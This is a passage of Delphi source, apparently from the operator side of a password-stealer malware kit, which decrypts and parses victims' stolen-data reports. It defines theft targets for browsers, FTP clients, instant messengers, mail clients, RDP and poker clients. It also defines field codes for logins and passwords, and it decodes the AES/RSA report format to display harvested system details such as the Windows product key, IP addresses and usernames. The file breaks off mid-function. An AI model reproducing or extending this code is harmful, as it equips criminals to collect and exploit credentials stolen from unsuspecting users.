﻿unit Parser;

interface

Uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, ComCtrls, Buttons, Wcrypt2, ImgList, CRCunit,
  Stealer_WTC, Stealer_Opera, Stealer_MRA, Stealer_TheBat, Stealer_SmartFTP,
  Stealer_Psi,Stealer_CoreFTP,Stealer_WS_FTP,Stealer_IncrediMail,
  Stealer_PokerStars,Stealer_FullTiltPoker,Stealer_WinSCP,Stealer_FAR,EncdDecd;

  function DecryptReport(fn:string{;windowed:boolean}):DWORD;
  function GetPwd:boolean;
  function IsReportPwdProtected(fn:string):boolean;
  procedure ShowGetFormPwd;
  procedure ClearSavedPwd;
  function formattype(z:dword):string;

var
  pwd:string;
  IsEnteredPwd:boolean;
  rsa_pwd_key:array[0..1023] of byte;
  rsa_pwd_key_len:dword;

const
  VER_NT_WORKSTATION = $00000001;
  VER_SUITE_DATACENTER = $00000080;
  VER_SUITE_ENTERPRISE = $00000002;
  VER_SUITE_PERSONAL = $00000200;
  VER_SUITE_STORAGE_SERVER = $00002000;
  VER_SUITE_WH_SERVER = $00008000;
  PROCESSOR_ARCHITECTURE_AMD64 = 9;
  PRODUCT_BUSINESS = $00000006;
  PRODUCT_BUSINESS_N = $00000010;
  PRODUCT_CLUSTER_SERVER = $00000012;
  PRODUCT_DATACENTER_SERVER = $00000008;
  PRODUCT_DATACENTER_SERVER_CORE = $0000000C;
  PRODUCT_DATACENTER_SERVER_CORE_V = $00000027;
  PRODUCT_DATACENTER_SERVER_V = $00000025;
  PRODUCT_ENTERPRISE = $00000004;
  PRODUCT_ENTERPRISE_E = $00000046;
  PRODUCT_ENTERPRISE_N = $0000001B;
  PRODUCT_ENTERPRISE_SERVER = $0000000A;
  PRODUCT_ENTERPRISE_SERVER_CORE = $0000000E;
  PRODUCT_ENTERPRISE_SERVER_CORE_V = $00000029;
  PRODUCT_ENTERPRISE_SERVER_IA64 = $0000000F;
  PRODUCT_ENTERPRISE_SERVER_V = $00000026;
  PRODUCT_HOME_BASIC = $00000002;
  PRODUCT_HOME_BASIC_E = $00000043;
  PRODUCT_HOME_BASIC_N = $00000005;
  PRODUCT_HOME_PREMIUM = $00000003;
  PRODUCT_HOME_PREMIUM_E = $00000044;
  PRODUCT_HOME_PREMIUM_N = $0000001A;
  PRODUCT_HYPERV = $0000002A;
  PRODUCT_MEDIUMBUSINESS_SERVER_MANAGEMENT = $0000001E;
  PRODUCT_MEDIUMBUSINESS_SERVER_MESSAGING = $00000020;
  PRODUCT_MEDIUMBUSINESS_SERVER_SECURITY = $0000001F;
  PRODUCT_PROFESSIONAL = $00000030;
  PRODUCT_PROFESSIONAL_E = $00000045;
  PRODUCT_PROFESSIONAL_N = $00000031;
  PRODUCT_SERVER_FOR_SMALLBUSINESS = $00000018;
  PRODUCT_SERVER_FOR_SMALLBUSINESS_V = $00000023;
  PRODUCT_SERVER_FOUNDATION = $00000021;
  PRODUCT_HOME_PREMIUM_SERVER = $00000022;
  PRODUCT_SB_SOLUTION_SERVER = $00000032;
  PRODUCT_HOME_SERVER = $00000013;
  PRODUCT_SMALLBUSINESS_SERVER = $00000009;
  PRODUCT_SOLUTION_EMBEDDEDSERVER = $00000038;
  PRODUCT_STANDARD_SERVER = $00000007;
  PRODUCT_STANDARD_SERVER_CORE = $0000000D;
  PRODUCT_STANDARD_SERVER_CORE_V = $00000028;
  PRODUCT_STANDARD_SERVER_V = $00000024;
  PRODUCT_STARTER = $0000000B;
  PRODUCT_STARTER_E = $00000042;
  PRODUCT_STARTER_N = $0000002F;
  PRODUCT_STORAGE_ENTERPRISE_SERVER = $00000017;
  PRODUCT_STORAGE_EXPRESS_SERVER = $00000014;
  PRODUCT_STORAGE_STANDARD_SERVER = $00000015;
  PRODUCT_STORAGE_WORKGROUP_SERVER = $00000016;
  PRODUCT_UNDEFINED = $00000000;
  PRODUCT_ULTIMATE = $00000001;
  PRODUCT_ULTIMATE_E = $00000047;
  PRODUCT_ULTIMATE_N = $0000001C;
  PRODUCT_WEB_SERVER = $00000011;
  PRODUCT_WEB_SERVER_CORE = $0000001D;
  //-----------
  SYSINFO_STEAL                     =   $00000099;
  LIVE_STEAL                        =   $00000010;
  FILEZILLA_STEAL                   =   $00000011;
  FXP_STEAL                         =   $00000012;
  IE_STEAL                          =   $00000013;
  WTC_STEAL                         =   $00000014;
  OPERA_STEAL                       =   $00000015;
  PIDGIN_STEAL                      =   $00000016;
  GTALK_STEAL                       =   $00000017;
  QIPINFIUM_STEAL                   =   $00000018;
  MIRANDA_STEAL                     =   $00000019;
  FIREFOX_STEAL                     =   $0000001A;
  MRA_STEAL                         =   $0000001B;
  ICQ_STEAL                         =   $0000001C;
  FAR_STEAL                         =   $0000001D;
  THEBAT_STEAL                      =   $0000001E;
  SMARTFTP_STEAL                    =   $0000001F;
  CHROME_STEAL                      =   $00000021;
  QIP2005_STEAL                     =   $00000022;
  THUNDERBIRD_STEAL                 =   $00000023;
  SAFARI_STEAL                      =   $00000024;
  PSI_STEAL                         =   $00000025;
  COREFTP_STEAL                     =   $00000027;
  WS_FTP_STEAL                      =   $00000028;
  RAS_STEAL                         =   $00000029;
  INCREDIMAIL_STEAL                 =   $0000002C;
  SEAMONKEY_STEAL                   =   $0000002D;
  RDP_STEAL                         =   $00000035;
  ICQ8_STEAL                        =   $00000036;
  POKERSTARS_STEAL                  =   $00000037;
  FULLTILTPOKER_STEAL               =   $00000038;
  WINSCP_STEAL                      =   $00000039;
  REPORT_DATA_BINARY                =   $10;
  REPORT_DATA_HOST                  =   $11;
  REPORT_DATA_LOGIN                 =   $22;
  REPORT_DATA_PWD                   =   $33;
  REPORT_DATA_UKWN                  =   $44;
  REPORT_DATA_URL                   =   $55;
  REPORT_DATA_PROTOCOL              =   $66;
  REPORT_DATA_NAME                  =   $77;
  REPORT_DATA_RAS_AREA_CODE         =   $79;
  REPORT_DATA_RAS_NUMBER            =   $7A;
  REPORT_DATA_SERVER                =   $7C;
  REPORT_DATA_EMAIL                 =   $7D;
  REPORT_DATA_BAT_EMAIL             =   $00008159;
  REPORT_DATA_BAT_SERVER            =   $00008179;
  REPORT_DATA_BAT_LOGIN             =   $000081A7;
  REPORT_DATA_BAT_PWD               =   $000081A6;
  REPORT_DATA_BAT_ACCPWD            =   $000081A8;
  REPORT_DATA_BAT_ACCOUNT           =   $00008174;
  REPORT_DATA_BAT_SMTP_LOGIN        =   $00008195;
  REPORT_DATA_BAT_SMTP_PWD          =   $000081BD;
  REPORT_DATA_BAT_SMTP_SERVER       =   $0000819E;
  REPORT_DATA_VALUE_NAME            =   $FF;
  REPORT_DATA_SYSINFO_IP            =   $66666666;
  REPORT_DATA_SYSINFO_PROCESS_MARK  =   $77777777;
  REPORT_DATA_SYSINFO_USERS_MARK    =   $88888888;
  REPORT_DATA_SYSINFO_SOFT_MARK     =   $99999999;
  REPORT_FOLDER_WINDOWS             =   $01;
  REPORT_FOLDER_SYSTEM              =   $02;
  REPORT_FOLDER_TEMP                =   $03;
  REPORT_FOLDER_MYDOCS              =   $04;
  REPORT_FOLDER_PROGRAM             =   $05;
  REPORT_FOLDER_AUTORUN             =   $06;
  ENCRYPT_AES                       =   $00000000;
  ENCRYPT_RSA                       =   $00000001;
  HEADER_DUMP_SIZE                  =   $40;
  MIRANDA_DATATYPE_AIM              =   $00;
  MIRANDA_DATATYPE_GG               =   $01;
  MIRANDA_DATATYPE_ICQ              =   $02;
  MIRANDA_DATATYPE_IRC              =   $03;
  MIRANDA_DATATYPE_JABBER           =   $04;
  MIRANDA_DATATYPE_MSN              =   $05;
  MIRANDA_DATATYPE_YAHOO            =   $06;

const
  TYPES: array[1..13] of string =
  ('Host','Login','Pwd','Value','URL','Protocol','Name','Area Code',
   'Number','ValID','E-mail','Server','Account');
  otstup = '  ';

implementation

uses
  Unit3, PwdEnterForm;

procedure ShowGetFormPwd;
begin
  EnableWindow(Form3.handle, false);
  Application.CreateForm(TForm15, Form15);
  repeat
    Sleep(20);
    Application.ProcessMessages();
  until IsEnteredPwd=true;
end;

procedure ClearSavedPwd;
begin
  IsEnteredPwd:=false;
  pwd:='';
  rsa_pwd_key_len:=0;
  fillchar(rsa_pwd_key,sizeof(rsa_pwd_key),0);
end;

function GetPwd:boolean;
begin
  if (IsEnteredPwd=true) and (pwd<>'') then
  begin
    result:=true;
    exit;
  end;
  result:=false;
  ClearSavedPwd;
  ShowGetFormPwd;
  if pwd<>'' then result:=true;
end;

function IsReportPwdProtected(fn:string):boolean;{READ 4th dword in report}
var
  hFile,hMap,hMapFile,fsz,dd,crypt_type:dword;
begin
  result:=false;
  hFile:=CreateFile(pchar(fn), GENERIC_READ,
                                FILE_SHARE_READ,
                                nil, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL, 0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  fsz:=GetFileSize(hFile,nil);
  if fsz=INVALID_FILE_SIZE then exit;
  if fsz<$20 then exit;
  hMap:=CreateFileMapping(hFile, nil, PAGE_READONLY, 0, fsz, nil);
  if hMap=0 then exit;
  hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
  if hMapFile=0 then exit;

  dd:=hMapFile+$0C;
  CopyMemory(@crypt_type,pointer(dd),sizeof(crypt_type));

  if crypt_type=1 then result:=true;

  UnmapViewOfFile(pointer(hMapFile));
  CloseHandle(hMap);
  CloseHandle(hFile);
end;

function formattype(z:dword):string;
var
  i:integer;
  s:string;
const
  maxlen=13;
begin
  case z of
    REPORT_DATA_HOST:s:=TYPES[1];
    REPORT_DATA_LOGIN:s:=TYPES[2];
    REPORT_DATA_PWD:s:=TYPES[3];
    REPORT_DATA_UKWN:s:=TYPES[4];
    REPORT_DATA_URL:s:=TYPES[5];
    REPORT_DATA_PROTOCOL:s:=TYPES[6];
    REPORT_DATA_NAME:s:=TYPES[7];
    REPORT_DATA_RAS_AREA_CODE:s:=TYPES[8];
    REPORT_DATA_RAS_NUMBER:s:=TYPES[9];
    REPORT_DATA_VALUE_NAME:s:=TYPES[10];
    REPORT_DATA_SERVER:s:=TYPES[12];
    REPORT_DATA_EMAIL:s:=TYPES[11];
    REPORT_DATA_BAT_EMAIL:s:=TYPES[11];
    REPORT_DATA_BAT_LOGIN:s:=TYPES[2];
    REPORT_DATA_BAT_SERVER:s:=TYPES[12];
    REPORT_DATA_BAT_PWD:s:=TYPES[3];
    REPORT_DATA_BAT_ACCPWD:s:=TYPES[3];
    REPORT_DATA_BAT_ACCOUNT:s:=TYPES[13];
    REPORT_DATA_BAT_SMTP_LOGIN:s:=TYPES[2];
    REPORT_DATA_BAT_SMTP_PWD:s:=TYPES[3];
    REPORT_DATA_BAT_SMTP_SERVER:s:=TYPES[12];
  end;
  result:=otstup+s+':';
  for i:=length(result) to maxlen do
  result:=result+' ';
end;

function strip_utf8_bom(fromstr:ansistring):ansistring;
begin
  result:=fromstr;
  if length(fromstr)>=3 then
  begin
    if (ord(fromstr[1])=$EF) and (ord(fromstr[2])=$BB) and (ord(fromstr[3])=$BF) then
    result:=copy(fromstr,4,length(fromstr)-3);
  end;
end;

function make_string_dump(hmap:DWORD):string;
var
  dumparr:array[1..HEADER_DUMP_SIZE] of byte;
  i:integer;
begin
  result:='';
  CopyMemory(@dumparr,pointer(hmap),HEADER_DUMP_SIZE);
  for i:=1 to HEADER_DUMP_SIZE do
  begin
    result:=result+Format('%.2x ', [dumparr[i]]);
    if (i mod 16) = 0 then
    result:=result+#13#10;
  end;
end;

function DecryptReport(fn:string{;windowed:boolean}{if gui - dont show GetPwd Window}):DWORD;
label
  next_check1,next_check2,ie7_onemoretime,fxp_onemoretime,fz_onemoretime,live_onemoretime,
  wtc_onemoretime,opera_onemoretime,pidgin_onemoretime,gtalk_onemoretime,infium_onemoretime,
  miranda_onemoretime,ff_onemoretime,icq_onemoretime,farfar_onemoretime,
  thebat_onemoretime,smartftp_onemoretime,chrome_onemoretime,q2005_onemoretime,
  tb_onemoretime,safari_onemoretime,psi_onemoretime,coreftp_onemoretime,
  wsftp_onemoretime,ras_onemoretime,im_onemoretime,seamonkey_onemoretime,
  OMG_FACKING_SHIT_1111,OMG_FACKING_SHIT_2222,rdp_onemoretime,pokerstars_onemoretime,
  fulltiltpoker_onemoretime,scp_onemoretime;
var
  hFile,fsz,hMap,hMapFile,key_size,datasize,hmemkey,datasize2,hdata,hdataold,hData2,
  i,MARK,VER,CRC,CRYPT_TYPE,a_Key,nr,dd,dd2,dd3,dd4,dd5,align_shit,ERROR_CODE,
  struc_size,struc_cnt,dwTemp:dword;
  s,s2,psi1,psi2,scp1,scp2,scp3:string;
  ans:ansistring;
  bb,bb2:byte;
  node,parentnode:TTreeNode;
  dw1,dw2,dw3,dw4,dw5,dw6:word;
  hProv:HCRYPTPROV;
  sl:tstringlist;
  l,err:integer;
  b:byte;
  procarch,suitemask:word;
  major,minor,build,smservr2,prodinfo,isx64:dword;
  csd,os:ansistring;
  prodtype:byte;
  softlist:tstringlist;
  pidgintmp,safaritmp,fftmp,seatmp,thunderbirdtmp,chromiumtmp,gtalktmp:RawByteString;
begin
  headerdump:='';
  hdata:=0;
  hdata2:=0;
  hmemkey:=0;
  result:=0;
  Form3.TreeView1.Items.BeginUpdate;
  Form3.TreeView1.Items.Clear;

  sysinfoabout:='  Общая информация о системе'+#13#10#13#10;
  ERROR_CODE:=0;
  hFile:=CreateFile(pchar(fn), GENERIC_READ,
                                FILE_SHARE_READ,
                                nil, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL, 0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  fsz:=GetFileSize(hFile,nil);
  if fsz=INVALID_FILE_SIZE then exit;
  hMap:=CreateFileMapping(hFile, nil, PAGE_READONLY, 0, fsz, nil);
  if hMap=0 then exit;
  hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0));
  if hMapFile=0 then exit;

  if fsz>=HEADER_DUMP_SIZE then headerdump:=make_string_dump(hMapFile);

  dd:=hMapFile+fsz-4;
  CopyMemory(@align_shit,pointer(dd),sizeof(align_shit));

  dd:=hMapFile;
  CopyMemory(@MARK,pointer(dd),sizeof(MARK));
  if MARK<>$21524655 then
  begin
    ERROR_CODE:=4;
    goto OMG_FACKING_SHIT_1111;
  end;

  inc(dd,4);
  CopyMemory(@VER,pointer(dd),sizeof(VER));

  if VER<>ufr_dword then
  begin
    ERROR_CODE:=1;
    goto OMG_FACKING_SHIT_1111;
  end;

  inc(dd,4);
  CopyMemory(@CRC,pointer(dd),sizeof(CRC));

  inc(dd,4);
  CopyMemory(@CRYPT_TYPE,pointer(dd),sizeof(CRYPT_TYPE));

  if CRYPT_TYPE=ENCRYPT_RSA then
  begin
    // Convert pwd string -> array of bytes
    if (length(pwd) mod 2)<>0 then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    if length(pwd)=0 then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    l:=length(pwd) div 2;
    for i:=0 to sizeof(RSA512_PRIVATE_HEADER)-1 do
    rsa_pwd_key[i]:=RSA512_PRIVATE_HEADER[i+1];
    for i:=1 to l do
    begin
      s2:='$'+pwd[i*2-1]+pwd[i*2];
      val(s2,b,err);
      if err<>0 then
      begin
        ERROR_CODE:=3;
        goto OMG_FACKING_SHIT_2222;
      end;
      rsa_pwd_key[i-1+sizeof(RSA512_PRIVATE_HEADER)]:=b;
    end;
    rsa_pwd_key_len:=l+sizeof(RSA512_PRIVATE_HEADER);
  end;

  inc(dd,4);
  CopyMemory(@key_size,pointer(dd),sizeof(key_size));

  hmemkey:=dword(VirtualAlloc(nil, key_size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE));

  inc(dd,4);
  CopyMemory(pointer(hmemkey),pointer(dd),key_size);

  datasize2:=fsz-sizeof(align_shit)-sizeof(MARK)-sizeof(VER)-sizeof(CRC)
                -sizeof(CRYPT_TYPE)-sizeof(key_size)-key_size;

  hdata2:=dword(VirtualAlloc(nil, datasize2, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE));

  inc(dd,key_size);
  CopyMemory(pointer(hdata2),pointer(dd),datasize2);

  dd:=GetNewCRC($FFFFFFFF, dword(hdata2), datasize2);
  if dd<>crc then
  begin
    ERROR_CODE:=2;
    goto OMG_FACKING_SHIT_2222;
  end;

  if not CryptAcquireContext(@hProv, nil, nil, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) then
  begin
    ERROR_CODE:=1;
    goto OMG_FACKING_SHIT_2222;
  end;

  if CRYPT_TYPE=ENCRYPT_AES then
  begin
    if not CryptImportKey(hProv, pointer(hmemkey), key_size, 0, 0, @a_Key) then
    begin
      ERROR_CODE:=1;
      goto OMG_FACKING_SHIT_2222;
    end;
    nr:=datasize2;
    if not CryptDecrypt(a_key, 0, FALSE, 0, pointer(hData2), @nr) then
    begin
      ERROR_CODE:=1;
      goto OMG_FACKING_SHIT_2222;
    end;
    CryptDestroyKey(a_key);
  end
  else
  begin
    // import RSA key
    if not CryptImportKey(hProv, @rsa_pwd_key, rsa_pwd_key_len, 0, 0, @a_Key) then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    nr:=key_size;
    // Decrypt AES key with RSA algo
    if not CryptDecrypt(a_key, 0, FALSE, 0, pointer(hmemkey), @nr) then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    CryptDestroyKey(a_key);
    // Decrypt data
    key_size:=nr;
    if not CryptImportKey(hProv, pointer(hmemkey), key_size, 0, 0, @a_Key) then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    nr:=datasize2;
    if not CryptDecrypt(a_key, 0, FALSE, 0, pointer(hData2), @nr) then
    begin
      ERROR_CODE:=3;
      goto OMG_FACKING_SHIT_2222;
    end;
    CryptDestroyKey(a_key);
  end;
  CryptReleaseContext(hProv, 0);

  CopyMemory(@datasize,pointer(hData2+datasize2-4-align_shit),4);

  hdata:=dword(VirtualAlloc(nil, datasize,
                            MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE));

  dd:=datasize2-align_shit-4;
  RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1 or COMPRESSION_ENGINE_MAXIMUM,
                      pointer(hdata), datasize, pointer(hData2), dd, @dwTemp);

OMG_FACKING_SHIT_2222:
  VirtualFree(pointer(hmemkey), 0, MEM_RELEASE);
  VirtualFree(pointer(hData2), 0, MEM_RELEASE);

OMG_FACKING_SHIT_1111:
  UnmapViewOfFile(pointer(hMapFile));
  CloseHandle(hMap);
  CloseHandle(hFile);

  if ERROR_CODE<>0 then
  begin
    result:=ERROR_CODE;
    Form3.TreeView1.Items.EndUpdate;
    Form3.TreeView1.Items.Clear;
    VirtualFree(pointer(hData), 0, MEM_RELEASE);
    Exit;
  end;

  // Init
  hdataold:=hData;
  // Get SysInfo
  Inc(hData,datasize-4);
  CopyMemory(@struc_size,pointer(hData),4);
  Dec(hData,struc_size);
  // ---------------------------
  // Parse Data
  sysinfo:='';
  // OS ver
  os:='';
  CopyMemory(@major,pointer(hData),4);
  Inc(hData,sizeof(major));
  CopyMemory(@minor,pointer(hData),4);
  Inc(hData,sizeof(minor));
  // SP info
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  csd:='';
  if dd<>0 then
  begin
    csd:=copy(pansichar(hData),0,dd);
    Inc(hData,dd);
  end;
  // Build Number
  CopyMemory(@build,pointer(hData),4);
  Inc(hData,sizeof(build));
  // Suite Mask
  CopyMemory(@suitemask,pointer(hData),4);
  Inc(hData,sizeof(suitemask));
  // Product type
  CopyMemory(@prodtype,pointer(hData),4);
  Inc(hData,sizeof(prodtype));
  // Processor Architecture
  CopyMemory(@procarch,pointer(hData),4);
  Inc(hData,sizeof(procarch));
  // Server shit dword
  CopyMemory(@smservr2,pointer(hData),4);
  Inc(hData,sizeof(smservr2));
  // Is x64?
  CopyMemory(@isx64,pointer(hData),4);
  Inc(hData,sizeof(isx64));
  // Product info OR -1
  CopyMemory(@prodinfo,pointer(hData),4);
  Inc(hData,sizeof(prodinfo));
  case major of
    5: case minor of
         0: begin
              os:='Windows 2000 ';
              case prodtype of
                VER_NT_WORKSTATION:
                  os:=os+'Professional';
              else
                begin
                  if (suitemask and VER_SUITE_DATACENTER <> 0) then
                    os:=os+'Datacenter Server'
                  else if (suitemask and VER_SUITE_ENTERPRISE <> 0) then
                    os:=os+'Advanced Server'
                  else
                    os:=os+'Server';  
                end;
              end;
            end;
         1: begin
              os:='Windows XP ';
              if (suitemask and VER_SUITE_PERSONAL <>0) then
                os:=os+'Home Edition'
              else
                os:=os+'Professional';  
            end;
         2: begin
              if smservr2 = 1 then
                os:='Windows Server 2003 R2'
              else if (suitemask and VER_SUITE_STORAGE_SERVER <> 0) then
                os:='Windows Storage Server 2003'
              else if (suitemask and VER_SUITE_WH_SERVER <> 0) then
                os:='Windows Home Server'
              else if ((prodtype = VER_NT_WORKSTATION)
                       and (procarch=PROCESSOR_ARCHITECTURE_AMD64)) then
                os:='Windows XP Professional x64 Edition'
              else
                os:='Windows Server 2003';
            end;
       end;
    6:
       begin
         case minor of
           0: begin
                if prodtype = VER_NT_WORKSTATION then
                  os:='Windows Vista'
                else
                  os:='Windows Server 2008';  
              end;
           1: begin
                if prodtype = VER_NT_WORKSTATION then
                  os:='Windows 7'
                else
                  os:='Windows Server 2008 R2';
              end;
           2: begin
                if prodtype = VER_NT_WORKSTATION then
                  os:='Windows 8'
                else
                  os:='Windows Server 2012';
              end;
         end;
         if (prodinfo <> $FFFFFFFF) then
         begin
           os:=os+' ';
           case prodinfo of
             PRODUCT_ULTIMATE:os:=os+'Ultimate Edition';
             PRODUCT_PROFESSIONAL:os:=os+'Professional';
             PRODUCT_HOME_PREMIUM:os:=os+'Home Premium Edition';
             PRODUCT_HOME_BASIC:os:=os+'Home Basic Edition';
             PRODUCT_ENTERPRISE:os:=os+'Enterprise Edition';
             PRODUCT_BUSINESS:os:=os+'Business Edition';
             PRODUCT_STARTER:os:=os+'Starter Edition';
             PRODUCT_CLUSTER_SERVER:os:=os+'Cluster Server Edition';
             PRODUCT_DATACENTER_SERVER:os:=os+'Datacenter Edition';
             PRODUCT_DATACENTER_SERVER_CORE:os:=os+'Datacenter Edition (core installation)';
             PRODUCT_ENTERPRISE_SERVER:os:=os+'Enterprise Edition';
             PRODUCT_ENTERPRISE_SERVER_CORE:os:=os+'Enterprise Edition (core installation)';
             PRODUCT_ENTERPRISE_SERVER_IA64:os:=os+'Enterprise Edition for Itanium-based Systems';
             PRODUCT_SMALLBUSINESS_SERVER:os:=os+'Small Business Server';
             PRODUCT_STANDARD_SERVER:os:=os+'Standard Edition';
             PRODUCT_STANDARD_SERVER_CORE:os:=os+'Standard Edition (core installation)';
             PRODUCT_WEB_SERVER:os:=os+'Web Server Edition';
           end;
         end;
       end;
  end;
  if csd<>'' then
  os:=os+' '+csd+' ';
  os:=os+'build '+inttostr(build);
  if isx64=1 then os:=os+' (64-bit)';
  sysinfo:=sysinfo+'  OS: '+os+#13#10;
  // Windows Key
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pansichar(hData),0,dd);
    sysinfo:=sysinfo+'  Windows Key: '+s+#13#10;
    Inc(hData,dd);
  end;
  // Windows ID
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pansichar(hData),0,dd);
    sysinfo:=sysinfo+'  Windows ID: '+s+#13#10;
    Inc(hData,dd);
  end;
  // Uptime
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  dd:=dd div 1000;
  dd2:=dd div (60*60*24);
  dd:=dd-(dd2*60*60*24);
  dd3:=dd div (60*60);
  dd:=dd-(dd3*60*60);
  dd4:=dd div (60);
  dd:=dd-(dd4*60);
  s:='  Аптайм: '+inttostr(dd2)+' дней '+
                  inttostr(dd3)+' часов '+
                  inttostr(dd4)+' минут '+
                  inttostr(dd)+' секунд ';
  sysinfo:=sysinfo+s+#13#10;
  // System Time
  CopyMemory(@dw1,pointer(hData),sizeof(dw1));
  Inc(hData,sizeof(dw1));
  CopyMemory(@dw2,pointer(hData),sizeof(dw2));
  Inc(hData,sizeof(dw2));
  CopyMemory(@dw3,pointer(hData),sizeof(dw3));
  Inc(hData,sizeof(dw3));
  CopyMemory(@dw4,pointer(hData),sizeof(dw4));
  Inc(hData,sizeof(dw4));
  CopyMemory(@dw5,pointer(hData),sizeof(dw5));
  Inc(hData,sizeof(dw5));
  CopyMemory(@dw6,pointer(hData),sizeof(dw6));
  Inc(hData,sizeof(dw6));
  s:='  Системное время: '+Format('%.2d:%.2d:%.2d %.2d-%.2d-%.4d',
                       [dw4,dw5,dw6,dw3,dw2,dw1])+#13#10;
  sysinfo:=sysinfo+s;
  // Country
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pchar(hData),0,dd div 2);
    sysinfo:=sysinfo+'  Страна: '+s+#13#10;
    Inc(hData,dd);
  end;
  // System lang
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pchar(hData),0,dd div 2);
    sysinfo:=sysinfo+'  Язык системы: '+s+#13#10;
    Inc(hData,dd);
  end;
  // Computer name
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pchar(hData),0,dd div 2);
    sysinfo:=sysinfo+'  Имя компьютера: '+s+#13#10;
    Inc(hData,dd);
  end;
  // Display data [resolution, bpp]
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  CopyMemory(@dd2,pointer(hData),4);
  Inc(hData,sizeof(dd2));
  CopyMemory(@dd3,pointer(hData),4);
  Inc(hData,sizeof(dd3));
  s:=inttostr(dd)+'x'+inttostr(dd2)+'x'+inttostr(dd3);
  sysinfo:=sysinfo+'  Разрешение экрана: '+s+#13#10;
  // Memory
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  s:=inttostr(dd);
  sysinfo:=sysinfo+'  RAM Всего: '+s+' MiBs'+#13#10;
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  s:=inttostr(dd);
  sysinfo:=sysinfo+'  RAM Свободно: '+s+' MiBs'+#13#10;
  // Drives
  disks:='';
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  for i:=1 to dd do
  begin
    CopyMemory(@dd2,pointer(hData),4);
    Inc(hData,sizeof(dd2));
    asm
      mov eax, dword ptr [dd2]
      mov bb, al
    end;
    CopyMemory(@dd3,pointer(hData),4);
    Inc(hData,sizeof(dd3));
    CopyMemory(@dd4,pointer(hData),4);
    Inc(hData,sizeof(dd4));
    CopyMemory(@dd5,pointer(hData),4);
    Inc(hData,sizeof(dd5));
    s:='  Диск '+chr(bb)+':\ - ';
    case dd3 of
      DRIVE_UNKNOWN:     s:=s+'UNKNOWN';
      DRIVE_NO_ROOT_DIR: s:=s+'UNKNOWN';
      DRIVE_REMOVABLE:   s:=s+'REMOVABLE';
      DRIVE_FIXED:       s:=s+'FIXED';
      DRIVE_REMOTE:      s:=s+'REMOTE';
      DRIVE_CDROM:       s:=s+'CDROM';
      DRIVE_RAMDISK:     s:=s+'RAMDISK';
    end;
    s:=s+' Размер: '+inttostr(dd4)+' GB; Свободно: '+inttostr(dd5)+' GB'+#13#10;
    disks:=disks+s;
  end;
  disks:=disks+#13#10;
  // Username
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  s:=copy(pwidechar(hData),0,dd div 2);
  sysinfo:=sysinfo+'  Имя пользователя: '+s+#13#10;
  Inc(hData,dd);
  // CPU Name
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=trim(copy(pansichar(hData),0,dd));
    sysinfo:=sysinfo+'  Имя CPU: '+s+#13#10;
    Inc(hData,dd);
  end;
  // CPU Identifier
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pansichar(hData),0,dd);
    sysinfo:=sysinfo+'  Идентификатор CPU: '+s+#13#10;
    Inc(hData,dd);
  end;
  // IPs
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  while dd <> REPORT_DATA_SYSINFO_IP do
  begin
    s:=copy(pansichar(hData),0,dd);
    Inc(hData,dd);
    sysinfo:=sysinfo+'  IP(внутренний): '+s+#13#10;
    CopyMemory(@dd,pointer(hData),4);
    Inc(hData,sizeof(dd));
  end;
  // Outer IP
  CopyMemory(@dd,pointer(hData),4);
  Inc(hData,sizeof(dd));
  if dd<>0 then
  begin
    s:=copy(pansichar(hData),0,dd);
    sysinfo:=sysinfo+'  IP(внешний): '+s+#13#10;
    Inc(hData,dd);
  end;
  sysinfo:=sysinfo+#13#10;
  // Folders
  Folders:='';
  for i:=1 to 6 do
  begin
    CopyMemory(@bb,pointer(hData),1);
    Inc(hData,sizeof(bb));
    CopyMemory(@dd2,pointer(hData),4);
    Inc(hData,sizeof(dd2));
    if dd2<>0 then
    begin
      case bb of
        REPORT_FOLDER_WINDOWS: Folders:=Folders+'  Папка Windows:'+#13#10;
        REPORT_FOLDER_SYSTEM:  Folders:=Folders+'  Папка system32:'+#13#10;
